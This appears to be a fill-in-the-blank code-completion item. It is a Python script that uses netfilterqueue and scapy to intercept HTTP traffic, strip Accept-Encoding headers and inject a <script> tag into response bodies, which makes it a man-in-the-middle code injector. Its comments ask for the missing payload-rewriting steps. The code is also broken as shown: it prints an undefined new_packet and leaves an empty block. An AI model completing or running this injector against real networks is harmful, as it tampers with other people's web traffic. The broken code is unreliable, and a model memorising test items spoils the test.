#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# Modify the payload of the packet and remove the length and checksum fields in the IP and TCP headers to ensure that the packet recalculates these values.
def set_load(packet,load):
    <FILL_HERE>
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load=scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport ==80:
            print("[+] Request")
            load=re.sub("Accept-Encoding:.*?\\r\\n","",load)
            
            print(new_packet.show())

        elif scapy_packet[scapy.TCP].sport ==80:
            print("[+] Response")
            #print(scapy_packet.show())
            load=load.replace("</body>","<script>alert('test');</script></body>")
            content_length_search=re.search("Content-Length:\s\d*",load)
            if content_length_search:
                content_length=content_length_search.group(0)
                print(content_length)

        # After modifying the packet payload, send the new packet to the queue for the modification to take effect and continue to be delivered to the destination.
        if load != scapy_packet[scapy.Raw].load:
            # code

    packet.accept()

queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()